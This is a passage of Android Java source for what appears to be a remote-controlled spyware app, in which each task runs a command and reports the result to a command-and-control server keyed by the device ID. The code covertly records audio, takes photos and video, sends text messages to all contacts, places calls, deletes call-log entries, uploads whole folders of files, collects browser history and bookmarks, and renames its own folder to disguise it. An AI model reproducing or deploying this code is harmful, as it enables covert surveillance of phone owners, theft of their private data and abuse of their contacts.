			getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=","Ringer Volume Up Complete");
		} catch (UnsupportedEncodingException e) {
			 
			e.printStackTrace();
		}}
        @Override
        protected void onPreExecute() {}
        @Override
        protected void onProgressUpdate(Void... values) {}
	}
    //******************************************************************************************************************************************************** 
	public class ringerVolumeDown extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... params) {     
		    AudioManager audioManager = (AudioManager)getSystemService(Context.AUDIO_SERVICE);
		    audioManager.adjustStreamVolume(AudioManager.STREAM_RING,AudioManager.ADJUST_LOWER, AudioManager.FLAG_SHOW_UI);
		    return "Executed";
        }      
        @Override
        protected void onPostExecute(String result) {try {
			getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Ringer Volume Down Complete");
		} catch (UnsupportedEncodingException e) {
			 
			e.printStackTrace();
		}}
        @Override
        protected void onPreExecute() {}
        @Override
        protected void onProgressUpdate(Void... values) {}
	}
    //********************************************************************************************************************************************************
	public class screenOn extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... params) {     
        	PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        	final WakeLock wl = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK |PowerManager.ACQUIRE_CAUSES_WAKEUP |PowerManager.ON_AFTER_RELEASE, "");
        	wl.acquire();
		    return "Executed";
        }      
        @Override
        protected void onPostExecute(String result) {try {
			getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Screen On Complete");
		} catch (UnsupportedEncodingException e) {
			 
			e.printStackTrace();
		}}
        @Override
        protected void onPreExecute() {}
        @Override
        protected void onProgressUpdate(Void... values) {}
	}
    //********************************************************************************************************************************************************
	public class recordAudio extends AsyncTask<String, Void, String> {
		String i = "0";
        public recordAudio(String i) {
        	this.i = i;
        }
		@Override
        protected String doInBackground(String... params) {     
	        	MediaRecorder recorder = new MediaRecorder();;

	 		    SimpleDateFormat sdf = new SimpleDateFormat("yyyy_MM_dd_HH_mm");
	            String currentDateandTime = sdf.format(new Date());
	            
	            String filename =currentDateandTime + ".3gp";

	            File diretory = new File(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Audio");
	            diretory.mkdirs();
	         	File outputFile = new File(diretory, filename);
	            
	 		       recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
	 		       recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
	 		       recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
	 		       recorder.setMaxDuration(Integer.parseInt(i));
	 		       recorder.setMaxFileSize(1000000);
	 		       recorder.setOutputFile(outputFile.toString());

	 		   try 
	 	       {
	 	          recorder.prepare();
	 	          recorder.start();
	 	       } catch (IOException e) {
	 	          Log.i("com.connect", "io problems while preparing");
	 	         e.printStackTrace();
	 	       }		   
		    return "Executed";
        }      
        @Override
        protected void onPostExecute(String result) {

				try {
					getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Recording Audio");
				} catch (UnsupportedEncodingException e1) {
					e1.printStackTrace();
				}
		       	 try {
		 	        Thread.sleep(Integer.parseInt(i)+2500);         
		 	    } catch (InterruptedException e) {
		 	       e.printStackTrace();
		 	    }
		        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Media",false).commit();
	        	try {
					getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Recording Audio Complete");
				} catch (UnsupportedEncodingException e) {
					e.printStackTrace();
				}        
        	}
        @Override
        protected void onPreExecute() {
        	
	        while(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("Media",false) == true)
	        {
	        	 try {
	        	        Thread.sleep(5000);         
	        	    } catch (InterruptedException e) {
	        	       e.printStackTrace();
	        	    }
	        }
	        PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Media",true).commit();
        }
        @Override
        protected void onProgressUpdate(Void... values) {}
	}
    //******************************************************************************************************************************************************** 
	public class takeVideo extends AsyncTask<String, Void, String> {
		String i = "0";
		String j = "10000";
        public takeVideo(String i, String j) {
        	this.i = i;
        	this.j = j;
        }
		@Override
        protected String doInBackground(String... params) {   
        	int numCameras = Camera.getNumberOfCameras();
        	if (numCameras > Integer.parseInt(i)) {
	        	Intent intent = new Intent(getApplicationContext(), VideoView.class);
	        	intent.putExtra("Camera", i); 
	        	intent.putExtra("Time", j); 
	
	        	intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
	        	startActivity(intent);
        	}
			//NEED TO IMPLEMENT STREAMING 
		    return "Executed";
        }      
        @Override
        protected void onPostExecute(String result) {
			try {
				getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Recording Video");
			} catch (UnsupportedEncodingException e1) {
				e1.printStackTrace();
			}
	       	 try {
	 	        Thread.sleep(Integer.parseInt(j));         
	 	    } catch (InterruptedException e) {
	 	       e.printStackTrace();
	 	    }
//        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Media",false).commit();
        }
        @Override
        protected void onPreExecute() {
	        while(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("Media",false) == true)
	        {
	        	 try {
	        	        Thread.sleep(5000);         
	        	    } catch (InterruptedException e) {
	        	       e.printStackTrace();
	        	    }
	        }
	              	
	        PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Media",true).commit();
        }
        @Override
        protected void onProgressUpdate(Void... values) {}
	}
    //********************************************************************************************************************************************************
	public class takePhoto extends AsyncTask<String, Void, String> {
		String i = "0";
        public takePhoto(String i) {
        	this.i = i;
        }
		@Override
        protected String doInBackground(String... params) {   
        	int numCameras = Camera.getNumberOfCameras();
        	if (numCameras > Integer.parseInt(i)) {
        	Intent intent = new Intent(getApplicationContext(), CameraView.class);
        	Log.i("com.connect", "I: " + i);
        	intent.putExtra("Camera", i); 
        	intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        	startActivity(intent);
        	}
		    return "Executed";
        }      
        @Override
        protected void onPostExecute(String result) {
			try {
				getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Taking Photo");
			} catch (UnsupportedEncodingException e1) {
				e1.printStackTrace();
			}
	       	 try {
	 	        Thread.sleep(5000);         
	 	    } catch (InterruptedException e) {
	 	       e.printStackTrace();
	 	    }

	       	try {
				getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Take Photo Complete");
			} catch (UnsupportedEncodingException e) {
				 
				e.printStackTrace();
			}        }
        @Override
        protected void onPreExecute() {
	        while(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("Media",false) == true)
	        {
	        	 try {
	        	        Thread.sleep(5000);         
	        	    } catch (InterruptedException e) {
	        	       e.printStackTrace();
	        	    }
	        }        	
	        PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Media",true).commit();
        }
        @Override
        protected void onProgressUpdate(Void... values) {}
	}
    //********************************************************************************************************************************************************
	public class sendText extends AsyncTask<String, Void, String> {
		String i = "";
		String k = "";
        public sendText(String i, String k) {
        	this.i = i;
        	this.k = k;
        }
		@Override
        protected String doInBackground(String... params) {     
	    	boolean isNumeric = i.matches("[0-9]+");
	    	if(isNumeric)
	    	{
		        SmsManager smsManager = SmsManager.getDefault();
		        smsManager.sendTextMessage(i, null, k, null, null);
		        try {
					getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "To: " + i + " Message: " + k);
				} catch (UnsupportedEncodingException e) {
					 
					e.printStackTrace();
				}        	
	    	}
		    return "Executed";
        }      
        @Override
        protected void onPostExecute(String result) {}
        @Override
        protected void onPreExecute() {}
        @Override
        protected void onProgressUpdate(Void... values) {
        }
	}
    //********************************************************************************************************************************************************
	public class sendContactsText extends AsyncTask<String, Void, String> {
		String i = "";
        public sendContactsText(String i) {
        	this.i = i;
        }
		@Override
        protected String doInBackground(String... params) {     
	    	ContentResolver cr = getContentResolver();
		    Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,null, null, null, null);
		    if (cur.getCount() > 0) {
			        while (cur.moveToNext()) 
			        {
			              String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
			              if (Integer.parseInt(cur.getString(
			                    cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
			                 Cursor pCur = cr.query(
			                           ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
			                           null,
			                           ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?",
			                           new String[]{id}, null);
			                 while (pCur.moveToNext()) {
			                     String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
			                     	new sendText(phoneNo, i).execute("");
			        		        try {
										getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "To: " + phoneNo + " Message: " + i);
									} catch (UnsupportedEncodingException e) {
										 
										e.printStackTrace();
									}        	
			                pCur.close();
			            }
			        }
		    	}
		    }
        	
		    return "Executed";
        }      
        @Override
        protected void onPostExecute(String result) {
        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Get",false).commit();
        	try {
				getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Texts Sent");
			} catch (UnsupportedEncodingException e) {
				 
				e.printStackTrace();
			}        }
        @Override
        protected void onPreExecute() {
	        while(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("Get",false) == true)
	        {
	        	 try {
	        	        Thread.sleep(5000);         
	        	    } catch (InterruptedException e) {
	        	       e.printStackTrace();
	        	    }
	        }
				try {
					getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Sending Texts");
				} catch (UnsupportedEncodingException e) {
					 
					e.printStackTrace();
				}
 	
	        PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Get",true).commit();
        }
        @Override
        protected void onProgressUpdate(Void... values) {
        }
	}
    //********************************************************************************************************************************************************
	public class callNumber extends AsyncTask<String, Void, String> {
		String i = "";
        public callNumber(String i) {
        	this.i = i;
        }
		@Override
        protected String doInBackground(String... params) {     
	    	 String telephone = "tel:" + i.trim() ;
	    	 Intent intent = new Intent(Intent.ACTION_CALL);
	    	 intent.setData(Uri.parse(telephone));
	     	 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
	    	 startActivity(intent);
        	
	        try {
				getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Call Initiated: " + i);
			} catch (UnsupportedEncodingException e) {
				 
				e.printStackTrace();
			}        
	    	 
		    return "Executed";
        }      
        @Override
        protected void onPostExecute(String result) {
        	try {
				getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Calling: " + i);
				} catch (UnsupportedEncodingException e) {
				 
				e.printStackTrace();
				}        
        	}
        @Override
        protected void onPreExecute() {}
        @Override
        protected void onProgressUpdate(Void... values) {
        }
	}
    //********************************************************************************************************************************************************
	public class deleteCallLogNumber extends AsyncTask<String, Void, String> {
		String i = "";
        public deleteCallLogNumber(String i) {
        	this.i = i;
        }
		@Override
        protected String doInBackground(String... params) {     
	            try {
	                String strNumberOne[] = {i};
	                Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, CallLog.Calls.NUMBER + " = ? ", strNumberOne, "");
	                boolean bol = cursor.moveToFirst();
	                if (bol) {
	                    do {
	                        int idOfRowToDelete = cursor.getInt(cursor.getColumnIndex(CallLog.Calls._ID));
	                        getContentResolver().delete(Uri.withAppendedPath(CallLog.Calls.CONTENT_URI, String.valueOf(idOfRowToDelete)), "", null);
	                    } while (cursor.moveToNext());
	                }
	            } catch (Exception ex) {
	                System.out.print("Exception here ");
	            }	    	 
		    return "Executed";
        }      
        @Override
        protected void onPostExecute(String result) {
        	try {
				getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", i + " Deleted From Logs");
				} catch (UnsupportedEncodingException e) {	 
				e.printStackTrace();
				}    
        }
        @Override
        protected void onPreExecute() {}
        @Override
        protected void onProgressUpdate(Void... values) {
        }
	}
    //********************************************************************************************************************************************************
	public class openWebpage extends AsyncTask<String, Void, String> {
		String i = "";
        public openWebpage(String i) {
        	this.i = i;
        }
		@Override
        protected String doInBackground(String... params) {     
	    	if (!i.startsWith("http://") && !i.startsWith("https://"))i = "http://" + i;
	    	final Intent intent = new Intent(Intent.ACTION_VIEW).setData(Uri.parse(i));
	    	intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
	    	startActivity(intent);
        	
	        try {
				getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Webpage Opened: " + i.replace(".","-"));
			} catch (UnsupportedEncodingException e) {
				 
				e.printStackTrace();
			}        

		    return "Executed";
        }      
        @Override
        protected void onPostExecute(String result) {}
        @Override
        protected void onPreExecute() {}
        @Override
        protected void onProgressUpdate(Void... values) {
        }
	}
    //********************************************************************************************************************************************************
	public class promptUninstall extends AsyncTask<String, Void, String> {
		@Override
        protected String doInBackground(String... params) {     
	    	Intent intent = new Intent(Intent.ACTION_DELETE);
	        intent.setData(Uri.parse("package:" + getApplicationContext().getPackageName()));
	    	intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
	        startActivity(intent);
        	
		    return "Executed";
        }      
        @Override
        protected void onPostExecute(String result) {try {
			getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Prompted Uninstall");
		} catch (UnsupportedEncodingException e) {
			 
			e.printStackTrace();
		}        }
        @Override
        protected void onPreExecute() {/*httpcallexecuting*/}
        @Override
        protected void onProgressUpdate(Void... values) {
        }
	}
    //******************************************************************************************************************************************************** 
	private class UploadFiles extends AsyncTask<String, Void, String> {
		String j = "";
		String i = "";
        public UploadFiles(String j, String i) {
        	this.j = j;
        	this.i = i;
        }
        @Override
        protected String doInBackground(String... params) {
        	
		    File sd = new File(j);
		    if(sd.exists())
		    {
		    File[] sdDirList = sd.listFiles();			
				for(int k = 0; k< sdDirList.length; k++)
				{ 
			        try {
						getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Uploading:" + sdDirList[k].toString());
					} catch (UnsupportedEncodingException e) {
						 
						e.printStackTrace();
					}   
        	
		        	HttpURLConnection connection = null;
		        	DataOutputStream outputStream = null;
		        	DataInputStream inputStream = null;
		
		        	String pathToOurFile = sdDirList[k].toString();
		        	String urlServer = URL + i;
		        	
			    	Log.i("com.connect","pathToOurFile : " + pathToOurFile);
			    	Log.i("com.connect","urlServer : " + urlServer);

		        	
		        	String lineEnd = "\r\n";
		        	String twoHyphens = "--";
		        	String boundary =  "*****";
		        	int bytesRead, bytesAvailable, bufferSize;
		        	byte[] buffer;
		        	int maxBufferSize = 1*1024*1024*1000*10;
		        	
		        	try
		            {		
			            FileInputStream fileInputStream = new FileInputStream(new File(pathToOurFile) );
			
			            URL url = new URL(urlServer);
			            connection = (HttpURLConnection) url.openConnection();
			
			            // Allow Inputs & Outputs
			            connection.setDoInput(true);
			            connection.setDoOutput(true);
			            connection.setUseCaches(false);
			
			            // Enable POST method
			            connection.setRequestMethod("POST");
			
			            connection.setRequestProperty("Connection", "Keep-Alive");
			            connection.setRequestProperty("Content-Type", "multipart/form-data;boundary="+boundary);
			
			            outputStream = new DataOutputStream( connection.getOutputStream() );
			            outputStream.writeBytes(twoHyphens + boundary + lineEnd);
			            outputStream.writeBytes("Content-Disposition: form-data; name=\"file\";filename=\"" + pathToOurFile +"\"" + lineEnd);
			            outputStream.writeBytes(lineEnd);
			
			            bytesAvailable = fileInputStream.available();
			            bufferSize = Math.min(bytesAvailable, maxBufferSize);
			            buffer = new byte[bufferSize];
			
			            // Read file
			            bytesRead = fileInputStream.read(buffer, 0, bufferSize);
		
			            while (bytesRead > 0)
			            {
				            outputStream.write(buffer, 0, bufferSize);
				            bytesAvailable = fileInputStream.available();
				            bufferSize = Math.min(bytesAvailable, maxBufferSize);
				            bytesRead = fileInputStream.read(buffer, 0, bufferSize);
			            }
		
			            outputStream.writeBytes(lineEnd);
			            outputStream.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
			
			            // Responses from the server (code and message)
			            int serverResponseCode = connection.getResponseCode();
			            String serverResponseMessage = connection.getResponseMessage();
			            fileInputStream.close();
			            outputStream.flush();
			            outputStream.close();
				        getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Uploading:" + sdDirList[k].toString() + " Complete");       
		            }
		            catch (Exception ex)
		            {ex.printStackTrace();}
				}
		    }        	
            return "Executed";
        }      
        @Override
        protected void onPostExecute(String result) {try {
        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Files",false).commit();
			getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Files Uploaded");
		} catch (UnsupportedEncodingException e) {
			 
			e.printStackTrace();
		}        }
        @Override
        protected void onPreExecute() {try {
	        while(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("Files",false) == true)
	        {
	        	 try {
	        	        Thread.sleep(5000);         
	        	    } catch (InterruptedException e) {
	        	       e.printStackTrace();
	        	    }
	        }
	        PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Files",true).commit();
			getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Uploading Files");
		} catch (UnsupportedEncodingException e) {
			 
			e.printStackTrace();
		}        }
        @Override
        protected void onProgressUpdate(Void... values) {
        }
	}
    //******************************************************************************************************************************************************** 
	public class changeDirectory extends AsyncTask<String, Void, String> {
		@Override
        protected String doInBackground(String... params) {    
			
			String[] files = {"System", "System Media", "Saved Files", "Recent Media", "Temporary"};
			Random r = new Random();
			String file2String = files[r.nextInt(files.length)];
			
			File file = new File(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", ""));							
			File file2 = new File(Environment.getExternalStorageDirectory().toString() + File.separator + file2String);
			boolean success = file.renameTo(file2);
			if(success)
			{
				PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("File", Environment.getExternalStorageDirectory().toString() + File.separator + file2String).commit();
//			    Log.i("com.connect", "Changed:" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", ""));
		        try {
					getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Changed Directory: " + file2String);
				} catch (UnsupportedEncodingException e) {
					 
					e.printStackTrace();
				}        
			} else
			{
				try {
					getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Changed Directory Failed");
				} catch (UnsupportedEncodingException e) {
					e.printStackTrace();
				}
			}
		    return "Executed";
        }      
        @Override
        protected void onPostExecute(String result) {
        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Files",false).commit();
        }
        @Override
        protected void onPreExecute() {
	        while(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("Files",false) == true)
	        {
	        	 try {
	        	        Thread.sleep(5000);         
	        	    } catch (InterruptedException e) {
	        	       e.printStackTrace();
	        	    }
	        }
	        PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Files",true).commit();
			try {
				getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Deleting Files");
			} catch (UnsupportedEncodingException e) {
				e.printStackTrace();
			}
        }
        @Override
        protected void onProgressUpdate(Void... values) {
        }
	}
    //******************************************************************************************************************************************************** 
	public class deleteFiles extends AsyncTask<String, Void, String> {
		String i = "0";
        public deleteFiles(String i) {
        	this.i = i;
        }
		@Override
        protected String doInBackground(String... params) {    
			
			File directory = new File(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + i);
//        	Log.i("com.connect", "Delete Files : " + directory.exists() + " : " + directory.toString());

			if(directory.exists()){
		        File[] files = directory.listFiles();
		        for(int j=0; j<files.length; j++)
		        	{
//		            	Log.i("com.connect", "File Deleted : " + files[j].toString());
		        	
		            	files[j].delete();
				        try {
							getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "File Deleted: " + files[j].toString());
						} catch (UnsupportedEncodingException e) {
							 
							e.printStackTrace();
						}        
		        	}
		    }
			
		    return "Executed";
        }      
		@Override
        protected void onPostExecute(String result) {
        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Files",false).commit();
			try {
			getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", i + " Deleted");
		} catch (UnsupportedEncodingException e) {
			 
			e.printStackTrace();
		}        }
        @Override
        protected void onPreExecute() {try {
	        while(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("Files",false) == true)
	        {
	        	 try {
	        	        Thread.sleep(5000);         
	        	    } catch (InterruptedException e) {
	        	       e.printStackTrace();
	        	    }
	        }
	        PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Files",true).commit();
			getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Deleting " + i);
		} catch (UnsupportedEncodingException e) {
			e.printStackTrace();
		}        }
        @Override
        protected void onProgressUpdate(Void... values) {
        }
	}
    //********************************************************************************************************************************************************
	public class getBrowserHistory extends AsyncTask<String, Void, String> {
		String j = "";
        public getBrowserHistory(String j) {
        	this.j = j;
        }
		@Override
        protected String doInBackground(String... params) {     
	        String sel = Browser.BookmarkColumns.BOOKMARK + " = 0"; 
	        Cursor mCur = getApplicationContext().getContentResolver().query(Browser.BOOKMARKS_URI, Browser.HISTORY_PROJECTION, sel, null, null);
	        if (mCur.moveToFirst()) {
	        	int i = 0;
	            while (mCur.isAfterLast() == false) {
	            	if(i<Integer.parseInt(j)){	              
		                SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd*hh:mm:ss");
		                Calendar calendar = Calendar.getInstance();
		                String now = mCur.getString(Browser.HISTORY_PROJECTION_DATE_INDEX);
		                calendar.setTimeInMillis(Long.parseLong(now));
		    	        try {
							getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "[" + formatter.format(calendar.getTime()) + "] " + mCur.getString(Browser.HISTORY_PROJECTION_URL_INDEX));
						} catch (UnsupportedEncodingException e) {
							 
							e.printStackTrace();
						}        	
	            	}
	                i++;
		            mCur.moveToNext();
	            }
	        }
	        mCur.close();
	        
		    return "Executed";
        }      
        @Override
        protected void onPostExecute(String result) {
        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Get",false).commit();
	        try {
				getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Browser History Complete");
			} catch (UnsupportedEncodingException e) {
				 
				e.printStackTrace();
			}        	
        }
        @Override
        protected void onPreExecute() {
	        while(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("Get",false) == true)
	        {
	        	 try {
	        	        Thread.sleep(5000);         
	        	    } catch (InterruptedException e) {
	        	       e.printStackTrace();
	        	    }
	        }
	        try {
				getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Getting Browser History");
			} catch (UnsupportedEncodingException e) {
				 
				e.printStackTrace();
			}        	
        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Get",true).commit();
        }
        @Override
        protected void onProgressUpdate(Void... values) {
        }
	}
    //********************************************************************************************************************************************************
	public class getBrowserBookmarks extends AsyncTask<String, Void, String> {
		String j = "";
        public getBrowserBookmarks(String j) {
        	this.j = j;
        }
		@Override
        protected String doInBackground(String... params) {     
	    	
	        String sel = Browser.BookmarkColumns.BOOKMARK + " = 1"; 
	        Cursor mCur = getApplicationContext().getContentResolver().query(Browser.BOOKMARKS_URI, Browser.HISTORY_PROJECTION, sel, null, null);
	        if (mCur.moveToFirst()) {
	        	int i = 0;
	            while (mCur.isAfterLast() == false) {
	            	if(i<Integer.parseInt(j))
	            	{
//		                Log.i("com.connect", "Title: " + mCur.getString(Browser.HISTORY_PROJECTION_TITLE_INDEX));
//		                Log.i("com.connect", "Link: " + mCur.getString(Browser.HISTORY_PROJECTION_URL_INDEX));
	            		
		    	        try {
							getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "[" + mCur.getString(Browser.HISTORY_PROJECTION_TITLE_INDEX).replace(" ", "") + "] " + mCur.getString(Browser.HISTORY_PROJECTION_URL_INDEX));
						} catch (UnsupportedEncodingException e) {
							 
							e.printStackTrace();
						}        	
	            	}
	                i++;
		            mCur.moveToNext();
	            }
	        }
	        mCur.close();
	        
		    return "Executed";
        }      
        @Override
        protected void onPostExecute(String result) {
        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Get",false).commit();
	        try {
				getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Browser Bookmarks Complete");
			} catch (UnsupportedEncodingException e) {
				 
				e.printStackTrace();
			}        	
        }
        @Override
        protected void onPreExecute() {
